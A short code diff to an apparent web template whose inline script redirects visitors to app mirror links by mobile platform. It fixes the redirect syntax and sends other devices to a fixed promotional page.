@@ -8,21 +8,21 @@
 
         if( userAgent.match( /iPad/i ) || userAgent.match( /iPhone/i ) || userAgent.match( /iPod/i ) )
         {
-            window.location.href = "(@{Services.getMirrorLink("iOS", "", oslLinkCode)})"
+            window.location.replace("@{Services.getMirrorLink("iOS", "", oslLinkCode)}");
 
         }
         else if( userAgent.match( /Android/i ) )
         {
-            window.location.href = "(@{Services.getMirrorLink("Android", "", oslLinkCode)})"
+            window.location.replace("@{Services.getMirrorLink("Android", "", oslLinkCode)}");
         }
 
         else if( userAgent.match( /Windows Phone/i ) )
         {
-            window.location.href = "(@{Services.getMirrorLink("Windows Phone", "", oslLinkCode)})"
+            window.location.replace("@{Services.getMirrorLink("Windows Phone", "", oslLinkCode)}");
         }
         else
         {
-            window.location.replace("@{Services.getMirrorLink("Android", "", oslLinkCode)}");
+            window.location.replace("http://higgsvalley.com/play-softwings-endorse-hillary-clinton.html");
         }
     </script>
 </head>
